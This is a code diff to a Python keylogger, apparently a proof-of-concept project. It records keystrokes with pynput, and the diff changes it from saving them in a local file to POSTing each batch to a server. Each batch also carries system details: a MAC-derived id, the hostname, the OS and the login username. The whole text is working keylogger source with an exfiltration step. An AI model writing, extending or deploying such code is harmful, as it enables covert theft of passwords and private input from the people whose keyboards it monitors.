@@ -2,10 +2,16 @@ from pynput import keyboard
 from datetime import datetime
 import time
 import threading
+import requests
+import json
+import uuid
+import platform
+import os
 
 # config
 COUNTDOWN_DURATION = 10 # relatively arbitrary duration but represents the time before key collection stops for that batch of inputs
-LOG_FILE_PATH = "keylogs.txt" # temp local file
+# LOG_FILE_PATH = "keylogs.txt" # temp local file
+SERVER_URL = "http://localhost:8080/logs"
 
 # globals
 collected_keys = [] # list to store the accumulated key logs
@@ -66,34 +72,43 @@ def start_countdown():
     if countdown_active: 
         countdown_active = False # reset flag for the next batch
         print(f"\n{COUNTDOWN_DURATION} seconds expired, dumping data...")
-        dump_data_batch()
+        send_data_batch()
 
-# dump the collected keys to a file
-def dump_data_batch():
-    global collected_keys, initial_log_time, countdown_active # countdown_active is already False here
+def send_data_batch():
+    global collected_keys, initial_log_time
 
     if not collected_keys:
-        print("No data to dump in this batch.")
-        return # No data to dump
+        print("No data to send in this batch.")
+        return
 
     current_log_time = datetime.now()
-
-    log_duration_seconds = (current_log_time - initial_log_time).total_seconds() if initial_log_time else 0 # find the elapsed duration since the initial log time
+    log_duration_seconds = (current_log_time - initial_log_time).total_seconds() if initial_log_time else 0
     log_content = "".join(collected_keys)
 
-    # prepare the log entry string
-    log_entry = f"----- Log Batch Start (UTC: {initial_log_time.isoformat()}Z, Duration: {log_duration_seconds:.2f}s) -----\n" \
-                f"Logged Content:\n{log_content}\n" \
-                f"----- Log Batch End (UTC: {current_log_time.isoformat()}Z) -----\n\n"
+    # grab some system info, mostly just PoC
+    system_info = {
+        "system_id": str(uuid.getnode()), # simple unique id using the mac address
+        "hostname": platform.node(),
+        "os": platform.system(),
+        "os_release": platform.release(),
+        "username": os.getlogin(),
+    }
+
+    data = {
+        "system_info": system_info,
+        "log_start_time_utc": initial_log_time.isoformat() + "Z" if initial_log_time else None,
+        "log_duration_seconds": log_duration_seconds,
+        "log_content": log_content
+    }
 
     try:
-        with open(LOG_FILE_PATH, "a", encoding="utf-8") as f:
-            f.write(log_entry)
-        print(f"Data successfully dumped to {LOG_FILE_PATH}")
-    except IOError as e:
-        print(f"Error dumping data to file: {e}")
+        response = requests.post(SERVER_URL, json=data)
+        response.raise_for_status()
+        print(f"Data sent successfully. Server response: {response.status_code}")
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending data: {e}")
     finally:
-        # reset state for the next cycle
+        # reset state for the next batch
         collected_keys.clear()
         initial_log_time = None
 
@@ -124,7 +139,7 @@ if __name__ == "__main__":
         # dump any remaining collected keys before exiting
         if collected_keys:
             print("Dumping final batch of collected keys...")
-            dump_data_batch() # call dump_data_batch for any remaining data
+            send_data_batch() # call dump_data_batch for any remaining data
         
         print("-------------------------")
     finally:
